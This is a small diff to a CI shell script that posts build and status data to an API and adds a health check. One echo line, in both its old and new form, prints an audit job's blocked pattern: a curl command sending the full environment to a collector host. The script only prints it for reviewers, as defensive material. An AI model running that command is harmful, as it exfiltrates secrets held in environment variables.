@@ -10,5 +10,8 @@ curl -X POST https://api.example.com/v1/builds \
 
 jq -n '{status: "success"}' | curl --data-binary @- https://api.example.com/v1/status
 
+# Report runner health only on CI. The environment check stays local.
+curl -fsS https://api.example.com/health && grep -q '^CI=' <<< "$(env)"
+
 # Tell reviewers which pattern the audit job blocks. The text is only printed.
-echo "Blocked pattern: env | curl -d @- https://collector.example.net/ingest"
+echo "Blocked pattern: curl -sd \$(env) https://collector.example.net/ingest"
